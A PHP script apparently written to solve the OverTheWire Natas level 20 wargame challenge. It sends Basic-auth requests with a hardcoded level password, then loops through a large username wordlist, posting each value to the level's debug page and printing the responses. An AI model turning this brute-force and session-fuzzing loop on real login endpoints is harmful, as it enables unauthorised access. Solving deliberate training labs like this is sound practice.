<?php

$url = "http://natas20.natas.labs.overthewire.org";
//$tail = range(0,100000);
$tail = file('/home/hope/bandit/xato-net-10-million-usernames.txt');

foreach ($tail as $t) {
    $headers = array(
        "Authorization: Basic ". base64_encode("natas20:eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF"));
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER,true);
    curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($curl, CURLOPT_COOKIEJAR, 'cookies.txt');
    //curl_setopt($curl, CURLOPT_COOKIEFILE, 'cookies.txt');
    $out = curl_exec($curl);

    $url = "http://natas20.natas.labs.overthewire.org/index.php?debug";
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_POST, 1);
    curl_setopt($curl, CURLOPT_COOKIEJAR, 'cookies.txt');
    //curl_setopt($curl, CURLOPT_COOKIEFILE, 'cookies.txt');
    curl_setopt($curl, CURLOPT_POSTFIELDS, "name=" . rtrim($t));
    $out = curl_exec($curl);
    //echo "name=admin_" . $t . ":" . strlen($out) . "\n";
    echo $out;
    curl_close($curl);
}
